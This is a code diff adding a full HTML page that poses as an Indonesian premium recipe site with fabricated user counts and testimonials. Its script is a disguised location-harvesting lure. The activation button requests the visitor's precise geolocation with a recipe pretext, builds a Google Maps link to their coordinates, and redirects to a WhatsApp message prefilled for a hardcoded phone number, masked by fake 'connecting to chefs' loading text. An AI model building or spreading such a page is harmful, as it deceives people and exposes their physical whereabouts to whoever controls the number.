@@ -1,1 +1,767 @@
 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuliner Nusantara - Platform Resep Premium</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(45deg, #FF6B6B, #4ECDC4, #45B7D1, #96CEB4, #FECA57);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .particle {
+            position: absolute;
+            font-size: 20px;
+            opacity: 0;
+            animation: particleFloat 20s infinite linear;
+        }
+        
+        @keyframes particleFloat {
+            0% {
+                transform: translateY(100vh) translateX(0) rotate(0deg);
+                opacity: 0;
+            }
+            5% { opacity: 1; }
+            95% { opacity: 1; }
+            100% {
+                transform: translateY(-100vh) translateX(200px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            padding: 15px 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+        
+        .logo-nav {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            font-weight: 700;
+            font-size: 20px;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .nav-link {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            padding: 8px 16px;
+            border-radius: 20px;
+        }
+        
+        .nav-link:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+        
+        .main-container {
+            display: flex;
+            min-height: 100vh;
+            padding-top: 80px;
+        }
+        
+        .sidebar {
+            width: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            padding: 30px 20px;
+            border-right: 1px solid rgba(255, 255, 255, 0.2);
+            position: fixed;
+            height: calc(100vh - 80px);
+            overflow-y: auto;
+            z-index: 100;
+        }
+        
+        .sidebar h3 {
+            color: white;
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .category-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            color: rgba(255, 255, 255, 0.9);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .category-item:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateX(10px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .content {
+            margin-left: 300px;
+            flex: 1;
+            padding: 40px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .hero-section {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+        
+        .hero-title {
+            font-size: 48px;
+            font-weight: 800;
+            color: white;
+            text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            margin-bottom: 15px;
+            animation: titleGlow 3s ease-in-out infinite alternate;
+        }
+        
+        @keyframes titleGlow {
+            0% { text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); }
+            100% { text-shadow: 0 4px 20px rgba(255, 255, 255, 0.3); }
+        }
+        
+        .hero-subtitle {
+            font-size: 20px;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+        }
+        
+        .stat-item {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            padding: 20px 30px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s ease;
+        }
+        
+        .stat-item:hover {
+            transform: translateY(-10px) scale(1.05);
+        }
+        
+        .stat-number {
+            font-size: 32px;
+            font-weight: 800;
+            color: #FFD700;
+            display: block;
+        }
+        
+        .stat-label {
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .main-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 50px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .main-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #FF6B6B, #4ECDC4, #45B7D1, #96CEB4, #FECA57);
+            background-size: 300% 100%;
+            animation: gradientMove 3s ease infinite;
+        }
+        
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .card-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .card-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: iconBounce 2s ease-in-out infinite;
+            filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.2));
+        }
+        
+        @keyframes iconBounce {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-20px) scale(1.1); }
+        }
+        
+        .card-title {
+            font-size: 36px;
+            color: #2c3e50;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+        
+        .card-subtitle {
+            font-size: 18px;
+            color: #7f8c8d;
+            font-weight: 500;
+        }
+        
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+        
+        .feature-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 30px;
+            border-radius: 20px;
+            color: white;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.6s;
+        }
+        
+        .feature-card:hover::before {
+            left: 100%;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-15px) scale(1.05);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.4);
+        }
+        
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+            animation: featureFloat 3s ease-in-out infinite;
+        }
+        
+        @keyframes featureFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .feature-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .feature-desc {
+            font-size: 14px;
+            opacity: 0.9;
+            line-height: 1.5;
+        }
+        
+        .cta-section {
+            text-align: center;
+            margin: 50px 0;
+            padding: 40px;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
+            border-radius: 25px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .cta-button {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            border-radius: 50px;
+            box-shadow: 0 10px 30px rgba(238, 90, 36, 0.4);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.6s;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-5px) scale(1.1);
+            box-shadow: 0 15px 40px rgba(238, 90, 36, 0.6);
+        }
+        
+        .cta-button:hover::before {
+            left: 100%;
+        }
+        
+        .cta-button:active {
+            transform: translateY(-2px) scale(1.05);
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            flex-direction: column;
+        }
+        
+        .loading-content {
+            text-align: center;
+            color: white;
+        }
+        
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .loading-text {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .loading-subtext {
+            font-size: 16px;
+            opacity: 0.8;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; }
+        }
+        
+        .testimonials {
+            margin: 50px 0;
+        }
+        
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+        }
+        
+        .testimonial {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+        
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        
+        .testimonial-author {
+            font-weight: 600;
+            color: #FFD700;
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+            }
+            .content {
+                margin-left: 0;
+                padding: 20px;
+            }
+            .hero-title {
+                font-size: 32px;
+            }
+            .main-card {
+                padding: 30px 20px;
+            }
+            .nav-links {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <nav class="navbar">
+        <div class="nav-content">
+            <div class="logo-nav">
+                <span>🍜</span>
+                <span>Kuliner Nusantara</span>
+            </div>
+            <div class="nav-links">
+                <a href="#" class="nav-link">Beranda</a>
+                <a href="#" class="nav-link">Resep</a>
+                <a href="#" class="nav-link">Komunitas</a>
+                <a href="#" class="nav-link">Tentang</a>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="main-container">
+        <aside class="sidebar">
+            <h3>🏛️ Kategori Daerah</h3>
+            <div class="category-item">
+                <span>🏝️</span>
+                <span>Sumatera</span>
+            </div>
+            <div class="category-item">
+                <span>🏛️</span>
+                <span>Jawa</span>
+            </div>
+            <div class="category-item">
+                <span>🌺</span>
+                <span>Bali & Nusa Tenggara</span>
+            </div>
+            <div class="category-item">
+                <span>🦋</span>
+                <span>Kalimantan</span>
+            </div>
+            <div class="category-item">
+                <span>🏞️</span>
+                <span>Sulawesi</span>
+            </div>
+            <div class="category-item">
+                <span>🦜</span>
+                <span>Maluku & Papua</span>
+            </div>
+            
+            <h3 style="margin-top: 30px;">⭐ Trending</h3>
+            <div class="category-item">
+                <span>🔥</span>
+                <span>Resep Viral</span>
+            </div>
+            <div class="category-item">
+                <span>👑</span>
+                <span>Chef Recommend</span>
+            </div>
+        </aside>
+        
+        <main class="content">
+            <section class="hero-section">
+                <h1 class="hero-title">Kuliner Nusantara</h1>
+                <p class="hero-subtitle">Platform Resep Premium Terlengkap di Indonesia</p>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <span class="stat-number">10,000+</span>
+                        <span class="stat-label">Resep Autentik</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">500+</span>
+                        <span class="stat-label">Chef Partner</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">1M+</span>
+                        <span class="stat-label">Pengguna Aktif</span>
+                    </div>
+                </div>
+            </section>
+            
+            <div class="main-card">
+                <div class="card-header">
+                    <div class="card-icon">🎯</div>
+                    <h2 class="card-title">Resep Personal Untuk Anda</h2>
+                    <p class="card-subtitle">Temukan resep khas daerah berdasarkan lokasi Anda</p>
+                </div>
+                
+                <div class="feature-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">📍</div>
+                        <h3 class="feature-title">Lokasi Cerdas</h3>
+                        <p class="feature-desc">Sistem AI kami mendeteksi lokasi Anda untuk memberikan rekomendasi resep makanan khas daerah setempat</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">👨‍🍳</div>
+                        <h3 class="feature-title">Chef Lokal</h3>
+                        <p class="feature-desc">Resep langsung dari chef dan ibu-ibu terbaik di daerah Anda dengan rahasia keluarga turun temurun</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🥘</div>
+                        <h3 class="feature-title">100% Autentik</h3>
+                        <p class="feature-desc">Setiap resep telah diverifikasi keasliannya oleh pakar kuliner dan komunitas lokal</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📱</div>
+                        <h3 class="feature-title">Panduan Video</h3>
+                        <p class="feature-desc">Tutorial step-by-step dengan video HD dari chef profesional untuk hasil sempurna</p>
+                    </div>
+                </div>
+                
+                <div class="cta-section">
+                    <h3 style="color: #2c3e50; font-size: 28px; margin-bottom: 20px; font-weight: 800;">
+                        🚀 Mulai Petualangan Kuliner Anda!
+                    </h3>
+                    <p style="color: #5a6c7d; margin-bottom: 30px; font-size: 16px;">
+                        Dapatkan akses premium ke ribuan resep pilihan dan panduan memasak eksklusif
+                    </p>
+                    <button class="cta-button" onclick="aktivasiRespPersonal()">
+                        🎁 Aktifkan Resep Personal
+                    </button>
+                </div>
+            </div>
+            
+            <section class="testimonials">
+                <h2 style="text-align: center; color: white; font-size: 32px; margin-bottom: 30px; font-weight: 700;">
+                    ❤️ Apa Kata Mereka
+                </h2>
+                <div class="testimonial-grid">
+                    <div class="testimonial">
+                        <p class="testimonial-text">"Luar biasa! Saya jadi bisa masak rendang asli Padang seperti nenek saya dulu. Terima kasih Kuliner Nusantara!"</p>
+                        <p class="testimonial-author">- Sari, Jakarta</p>
+                    </div>
+                    <div class="testimonial">
+                        <p class="testimonial-text">"Resep gudeg yang saya dapat persis seperti buatan Bu Djoko di Yogya. Suami sampai nangis kangen kampung halaman."</p>
+                        <p class="testimonial-author">- Rina, Surabaya</p>
+                    </div>
+                    <div class="testimonial">
+                        <p class="testimonial-text">"Aplikasi ini benar-benar mengerti selera lokal. Resep pempek Palembang nya authentic banget!"</p>
+                        <p class="testimonial-author">- Dedi, Medan</p>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Menganalisis Lokasi Kuliner Anda</div>
+            <div class="loading-subtext">Menghubungkan dengan chef lokal terbaik...</div>
+        </div>
+    </div>
+
+    <script>
+        const particles = ['🍜', '🍛', '🥘', '🍲', '🥙', '🌮', '🍱', '🍙', '🥟', '🍢', '🍡', '🧆', '🥠', '🍠', '🥮', '🍘'];
+        
+        function createParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.textContent = particles[Math.floor(Math.random() * particles.length)];
+            particle.style.left = Math.random() * window.innerWidth + 'px';
+            particle.style.animationDuration = (Math.random() * 15 + 15) + 's';
+            particle.style.animationDelay = Math.random() * 5 + 's';
+            document.getElementById('particles').appendChild(particle);
+            
+            setTimeout(() => {
+                if (particle.parentNode) {
+                    particle.parentNode.removeChild(particle);
+                }
+            }, 25000);
+        }
+        
+        function aktivasiRespPersonal() {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            loadingOverlay.style.display = 'flex';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    kirimDataLokasi,
+                    function(error) {
+                        loadingOverlay.style.display = 'none';
+                        alert("🔒 Akses lokasi diperlukan untuk memberikan rekomendasi resep yang tepat sesuai daerah Anda. Mohon aktifkan layanan lokasi dan coba lagi.");
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                loadingOverlay.style.display = 'none';
+                alert("❌ Browser Anda tidak mendukung layanan lokasi. Silakan gunakan browser yang lebih modern untuk pengalaman terbaik.");
+            }
+        }
+        
+        function kirimDataLokasi(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const waNumber = "6289526335486";
+            
+            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            const message = `🍜 AKTIVASI RESEP PERSONAL PREMIUM 🍜\n\n👑 KULINER NUSANTARA - VIP ACCESS\n\n📍 Data Lokasi Kuliner:\n${mapsLink}\n\n📊 Detail Akurasi: ${Math.round(accuracy)}m\n📅 Waktu: ${new Date().toLocaleString('id-ID')}\n\n🙏 Mohon aktivasi akun premium saya untuk mendapatkan:\n✅ Resep khas daerah saya\n✅ Panduan video eksklusif\n✅ Akses chef lokal terbaik\n✅ Konsultasi masakan gratis\n\n🔥 Saya siap memulai petualangan kuliner yang autentik!\n\nTerima kasih! 🌟\n\n#KulinerNusantara #ResepPremium #ChefLokal`;
+            
+            const waUrl = `https://wa.me/${waNumber}?text=${encodeURIComponent(message)}`;
+            
+            // Simulate processing time
+            setTimeout(() => {
+                document.querySelector('.loading-text').textContent = 'Menghubungkan ke Chef Lokal...';
+            }, 1500);
+            
+            setTimeout(() => {
+                document.querySelector('.loading-text').textContent = 'Menyiapkan Resep Eksklusif...';
+            }, 3000);
+            
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                window.location.href = waUrl;
+            }, 4500);
+        }
+        
+        // Category item interactions
+        document.querySelectorAll('.category-item').forEach(item => {
+            item.addEventListener('click', function() {
+                // Remove active class from all items
+                document.querySelectorAll('.category-item').forEach(i => i.classList.remove('active'));
+                // Add active class to clicked item
+                this.classList.add('active');
+                
+                // Visual feedback
+                this.style.background = 'rgba(255, 255, 255, 0.3)';
+                setTimeout(() => {
+                    this.style.background = 'rgba(255, 255, 255, 0.1)';
+                }, 300);
+            });
+        });
+        
+        // Initialize particles
+        window.addEventListener('load', function() {
+            // Create initial particles
+            for(let i = 0; i < 10; i++) {
+                setTimeout(createParticle, i * 2000);
+            }
+            
+            // Continue creating particles
+            setInterval(createParticle, 4000);
+        });
+        
+        // Add scroll effects
+        window.addEventListener('scroll', function() {
+            const scrolled = window.pageYOffset;
+            const navbar = document.querySelector('.navbar');
+            
+            if (scrolled > 100) {
+                navbar.style.background = 'rgba(255, 255, 255, 0.15)';
+            } else {
+                navbar.style.background = 'rgba(255, 255, 255, 0.1)';
+            }
+        });
+        
+        // Feature card hover sound effect (visual)
+        document.querySelectorAll('.feature-card').forEach(card => {
+            card.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-15px) scale(1.05) rotateX(5deg)';
+            });
+            
+            card.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0) scale(1) rotateX(0deg)';
+            });
+        });
+    </script>
+</body>
+</html>
